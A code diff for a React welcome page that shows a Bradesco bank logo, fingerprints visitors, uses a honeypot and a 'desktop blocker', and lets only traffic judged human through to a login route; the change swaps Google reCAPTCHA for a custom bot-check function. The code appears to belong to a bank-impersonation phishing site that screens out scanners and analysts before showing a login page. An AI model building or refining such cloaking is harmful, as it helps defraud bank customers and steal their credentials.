@@ -1,5 +1,5 @@
 import { useNavigate } from "react-router-dom";
-import { useCallback, useState, useEffect, useRef } from "react";
+import { useState, useEffect, useRef } from "react";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 import { markSessionStarted } from "@/hooks/useRouteGuard";
 import { supabase } from "@/integrations/supabase/client";
@@ -10,15 +10,6 @@ import {
   setHoneypotValue,
   runClientSideValidation,
 } from "@/lib/botProtection";
-
-declare global {
-  interface Window {
-    grecaptcha: any;
-    onRecaptchaSuccess: (token: string) => void;
-  }
-}
-
-const RECAPTCHA_SITE_KEY = "6LcI5JQsAAAAAMsI-_QhAk89MSuKiPRLKK_KNJJK";
 
 const WelcomePage = () => {
   const navigate = useNavigate();
@@ -32,7 +23,8 @@ const WelcomePage = () => {
     return () => stopInteractionTracking();
   }, []);
 
-  const onRecaptchaSuccess = useCallback(async (token: string) => {
+  const handleClick = async () => {
+    if (loading) return;
     setLoading(true);
 
     // Update honeypot value from hidden field
@@ -50,9 +42,8 @@ const WelcomePage = () => {
     }
 
     try {
-      const { data, error } = await supabase.functions.invoke("verify-recaptcha", {
+      const { data, error } = await supabase.functions.invoke("verify-bot-protection", {
         body: {
-          token,
           fingerprint: validation.fingerprint,
           checks: validation.checks,
           botReasons: validation.botReasons,
@@ -65,7 +56,6 @@ const WelcomePage = () => {
         return;
       }
 
-      // Store session proof
       sessionStorage.setItem("session_proof", data.sessionProof);
       markSessionStarted();
       navigate("/login");
@@ -73,16 +63,7 @@ const WelcomePage = () => {
       console.error("Erro ao verificar:", err);
       setLoading(false);
     }
-  }, [navigate]);
-
-  const handleClick = () => {
-    if (loading) return;
-    window.onRecaptchaSuccess = onRecaptchaSuccess;
-    if (window.grecaptcha) {
-      window.grecaptcha.execute();
-    }
   };
-
   return (
     <>
       {/* Desktop blocker */}
@@ -152,12 +133,6 @@ const WelcomePage = () => {
               />
             </div>
 
-            <div
-              className="g-recaptcha"
-              data-sitekey={RECAPTCHA_SITE_KEY}
-              data-callback="onRecaptchaSuccess"
-              data-size="invisible"
-            />
             <button
               onClick={handleClick}
               disabled={loading}
